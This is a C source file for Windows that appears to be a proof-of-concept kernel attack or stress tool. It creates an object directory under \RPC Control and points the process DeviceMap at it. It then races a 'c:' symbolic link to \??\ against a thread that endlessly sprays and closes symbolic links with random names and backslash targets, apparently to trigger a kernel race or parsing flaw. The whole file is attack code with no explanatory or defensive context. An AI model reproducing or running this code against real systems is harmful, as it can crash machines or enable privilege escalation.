#include "stdafx.h"
#include "time.h"
#include "Header.h"


extern HANDLE hSubDir;


void DoSpray(HANDLE hDirectory)
{
	srand(time(NULL));


	ulong PrefProc = 1;
	if(!SetThreadAffinityMask(GetCurrentThread(),(ulong)(1 << PrefProc)))
	{
		printf("Warning: Error setting affinity mask\r\n");
		return;
	}
	if(SetThreadIdealProcessor(GetCurrentThread(),PrefProc) == -1)
	{
		printf("Warning: Error setting ideal processor, Err: %X\r\n", GetLastError());
	}

	ulong CountHandles = 0x100000;
	while(1)
	{
		CountHandles = 1 + Rand()%0x100000;
		HANDLE* pHandles = (HANDLE*)VirtualAlloc(0,CountHandles * sizeof(HANDLE),MEM_COMMIT,PAGE_READWRITE);
		if(pHandles)
		{
			//Create
			for(ulong i = 0;i<CountHandles;i++)
			{
				wchar_t SymName[0x30]={0};
				GetRandomWideString(SymName,0x30);

				ulong NumberOfBackSlashes = 1 + Rand()%0x10;
				ulong szToAlloc = NumberOfBackSlashes*sizeof(wchar_t);
				wchar_t* wTarget = (wchar_t*)VirtualAlloc(0,szToAlloc,MEM_COMMIT,PAGE_READWRITE);
				if(!wTarget) 
				{
					printf("Memory failure allocating: %X bytes\r\n",szToAlloc);
					ExitProcess(0);
				}
				else
				{
					wmemset(wTarget,L'\\',NumberOfBackSlashes-1);
					//wprintf(L"%s\r\n",wTarget);

					pHandles[i] = AddSymbolicLinkToDirectory_same(hDirectory,SymName,wTarget);

					VirtualFree(wTarget,0,MEM_RELEASE);
				}
			}
			//Wait
			//Sleep(100);

			//Destroy
			for(ulong i = 0;i<CountHandles;i++)
			{
				if(pHandles[i])
				{
					ZwClose(pHandles[i]);
					pHandles[i] = 0;
				}
			}

			VirtualFree(pHandles,0,MEM_RELEASE);
		}
	}
}


void SprayLinkTargets()
{
	wchar_t* pZ = L"\\RPC Control";
	wprintf(L"%s\r\n",pZ);


	_UNICODE_STRING UNI = {0};
	UNI.Length=wcslen(pZ)*2;
	UNI.MaxLength=UNI.Length+2;
	UNI.Buffer=pZ;

	_OBJECT_ATTRIBUTES ObjAttr = {sizeof(ObjAttr)};
	ObjAttr.ObjectName=&UNI;
	ObjAttr.Attributes=OBJ_CASE_INSENSITIVE;

	HANDLE hDir = 0;
	int ret = ZwOpenDirectoryObject(&hDir,GENERIC_READ|GENERIC_WRITE,&ObjAttr);
	wprintf(L"ZwOpenDirectoryObject, ret: %X, HANDLE: %X\r\n",ret,hDir);
	if(ret < 0)
	{
		printf("Can't find parent directory object\r\n");
		return;
	}
	//-------- Create SubDir ---------
	wchar_t* wSubDir = L"waliedxxx";
	_UNICODE_STRING uniSub = {0};
	uniSub.Length = wcslen(wSubDir) * 2;
	uniSub.MaxLength = uniSub.Length + 2;
	uniSub.Buffer = wSubDir;

	_OBJECT_ATTRIBUTES objAttrSub = {0};
	objAttrSub.Length = sizeof(objAttrSub);
	objAttrSub.Attributes = OBJ_CASE_INSENSITIVE;
	objAttrSub.ObjectName = &uniSub;
	objAttrSub.RootDirectory = hDir;


	ret = ZwCreateDirectoryObjectEx(&hSubDir,GENERIC_ALL,&objAttrSub,0,0);
	wprintf(L"ZwCreateDirectoryObjectEx, ret: %X, HANDLE: %X\r\n",ret,hSubDir);
	if(ret < 0)
	{
		printf("Can't create subdirectory object\r\n");
		return;
	}

	
	//----------Assign DeviceMap to the new directory object---------------
	int retP = ZwSetInformationProcess( GetCurrentProcess(),ProcessDeviceMap,&hSubDir,0x8);
	printf("ZwSetInformationProcess, ret: %X\r\n",retP);
	//---------------------------------------------------------------------
	ulong tid = 0;
	CreateThread(0,0x1000,(LPTHREAD_START_ROUTINE)DoSpray,(void*)hSubDir,0,&tid);

	Sleep(1000);


	while(1)
	{
		wchar_t wTarget[]=L"\\??\\";
		HANDLE hSymX = AddSymbolicLinkToDirectory_same(hSubDir,L"c:",wTarget);
		//Sleep(10);
		if(hSymX)	ZwClose(hSymX);
	}



	Sleep(-1);
	
}